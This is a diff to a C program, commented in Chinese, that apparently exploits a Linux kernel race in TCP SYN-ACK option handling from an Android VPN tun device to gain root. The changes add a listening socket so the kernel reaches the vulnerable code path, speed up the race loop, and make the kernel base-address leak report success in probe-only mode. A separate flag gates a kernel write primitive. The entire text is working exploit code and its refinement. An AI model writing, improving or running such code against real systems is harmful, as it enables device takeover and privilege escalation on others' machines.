@@ -21,6 +21,7 @@
 
 #define _GNU_SOURCE
 #include <arpa/inet.h>
+#include <netinet/in.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <pthread.h>
@@ -336,6 +337,66 @@ static void spray_stop(void) {
     pthread_join(g_spray_thread, NULL);
 }
 
+/* ------------------------------------------------------------ 监听端
+
+ * 没有监听套接字，内核根本不会为这个端口建请求 sock：SYN 到达后直接回 RST，
+ * tcp_v4_save_options() 不会被调用，ireq_opt 也就不存在。整条链的第一步
+ * 是**真的在目标端口上 listen**，让内核走 tcp_conn_request 那条路。
+ *
+ * 端口选在 tun 子网的对端地址上：VpnService 已把 10.7.7.0/24 路由进 tun，
+ * 绑定 10.7.7.1:g_port 之后，从 tun 投递进来的包会正常命中这个监听。
+ */
+static int g_listen_fd = -1;
+
+static int listen_open(uint16_t port) {
+    int fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0) {
+        say("[listen] socket 失败 errno=%d", errno);
+        return -1;
+    }
+    int one = 1;
+    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+
+    struct sockaddr_in addr;
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    addr.sin_addr.s_addr = g_dst;
+
+    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
+        say("[listen] bind %u.%u.%u.%u:%u 失败 errno=%d（地址还没配上？）",
+            (g_dst >> 24) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 8) & 0xff,
+            g_dst & 0xff, port, errno);
+        close(fd);
+        return -1;
+    }
+    if (listen(fd, 128) < 0) {
+        say("[listen] listen 失败 errno=%d", errno);
+        close(fd);
+        return -1;
+    }
+    /* 非阻塞：accept 只在空闲时排空队列，不能把主流程卡住。 */
+    int flags = fcntl(fd, F_GETFL, 0);
+    fcntl(fd, F_SETFL, flags | O_NONBLOCK);
+    say("[listen] 已在 %u.%u.%u.%u:%u 监听",
+        (g_dst >> 24) & 0xff, (g_dst >> 16) & 0xff, (g_dst >> 8) & 0xff, g_dst & 0xff, port);
+    return fd;
+}
+
+/* 把已完成握手的连接取出来立刻关掉，免得队列堆满。
+ * 只关心“内核有没有建请求 sock”，accept 到东西本身就是证据。 */
+static int listen_drain(void) {
+    if (g_listen_fd < 0) return 0;
+    int n = 0;
+    for (;;) {
+        int c = accept(g_listen_fd, NULL, NULL);
+        if (c < 0) break;
+        close(c);
+        n++;
+    }
+    return n;
+}
+
 /* ------------------------------------------------------------ 单次请求 */
 
 /* 发一个 SYN，等它的 SYNACK；返回 1 拿到、0 没有。 */
@@ -362,8 +423,10 @@ static int syn_round(uint16_t *sport_out, uint32_t *seq_out, struct synack *out)
         struct timespec now;
         clock_gettime(CLOCK_MONOTONIC, &now);
         long ms = (now.tv_sec - t0.tv_sec) * 1000 + (now.tv_nsec - t0.tv_nsec) / 1000000;
-        if (ms > 200) return 0;
-        usleep(200);
+        /* 60ms 足够本地 tun 往返；原来 200ms × 4000 轮 = 13 分钟，
+         * 收不到包时看起来就是卡死。 */
+        if (ms > 60) return 0;
+        usleep(100);
     }
 }
 
@@ -524,13 +587,28 @@ static int find_text_candidates(const struct synack *s, uint64_t *out, int max) 
  * 用 drain_for 当场收走，等下一轮再看就永远看不到。 */
 static int phase_race(struct hit_ctx *hit) {
     int found = 0;
+    int blind = 0;
     say("开始竞态：喷淋 %d 个对象/轮，最多 %d 轮", SPRAY_SOCKS, g_rounds);
     spray_start();
     for (int r = 0; r < g_rounds && !found; r++) {
         uint16_t sport;
         uint32_t isn;
         struct synack s;
-        if (!syn_round(&sport, &isn, &s)) { g_none++; continue; }
+        if (!syn_round(&sport, &isn, &s)) {
+            g_none++;
+            /* 连续 200 轮一个 SYNACK 都没收到，说明通道根本不通
+             * （没监听、路由不对、或包没进 tun），继续空转没有意义。 */
+            if (++blind >= 200) {
+                say("[!] 连续 %d 轮收不到任何 SYNACK，判定通道不通", blind);
+                say("[!] 检查：端口 %u 是否在 %u.%u.%u.%u 上 listen、tun 是否收到包",
+                    g_port, (g_dst >> 24) & 0xff, (g_dst >> 16) & 0xff,
+                    (g_dst >> 8) & 0xff, g_dst & 0xff);
+                spray_stop();
+                return 1;
+            }
+            continue;
+        }
+        blind = 0;
         g_synack++;
         if (s.optlen == 0) {
             g_clear++;
@@ -550,6 +628,7 @@ static int phase_race(struct hit_ctx *hit) {
          * tcp_v4_send_synack 那条 RCU 读路径。 */
         fire_pair(sport, isn, s.seq);
         usleep(1500);
+        listen_drain();
 
         /* 重传那条路径的 SYNACK 带的是本轮 sport，必须在这里收，不能等下一轮。 */
         struct synack late[8];
@@ -727,8 +806,10 @@ static int phase_root(struct hit_ctx *hit) {
     say("[key] 已释放");
 
     if (!g_allow_write) {
-        say("[!] 写原语默认不启用。确认上面地址无误后加 --allow-write 再跑");
-        return 1;
+        /* 只探测模式到这里就算完成：基址解出来了、add_key 通路验证过了。
+         * 返回 0 让上层知道“探测成功”，而不是“失败”。 */
+        say("[OK] 探测完成（未写内核）。要真的写请选「允许写入」");
+        return 0;
     }
 
     /* 真正的写：把喷淋源换成 add_key，再打一轮竞态。
@@ -771,6 +852,13 @@ int main(int argc, char **argv) {
     if (g_tun < 0) { FAIL("缺少 --tun-fd"); return 2; }
     say("synopt: release=%s tun=%d dst=%08x port=%u phase=%s", SYNOPT_RELEASE, g_tun, g_dst, g_port, phase);
 
+    /* 先真的在目标端口 listen：没有监听套接字，内核不会为 SYN 建请求 sock。 */
+    g_listen_fd = listen_open(g_port);
+    if (g_listen_fd < 0) {
+        FAIL("监听端口失败，无法进入 tcp_conn_request");
+        return 2;
+    }
+
     pthread_t th;
     if (pthread_create(&th, NULL, reader, NULL) != 0) { FAIL("读线程起不来"); return 2; }
 
@@ -790,6 +878,7 @@ int main(int argc, char **argv) {
 
     say("统计: tx=%lu synack=%lu hit=%lu clear=%lu none=%lu", g_tx, g_synack, g_hit, g_clear, g_none);
     g_running = 0;
+    if (g_listen_fd >= 0) { close(g_listen_fd); g_listen_fd = -1; }
     pthread_join(th, NULL);
     if (rc == 0) say("OK");
     return rc;
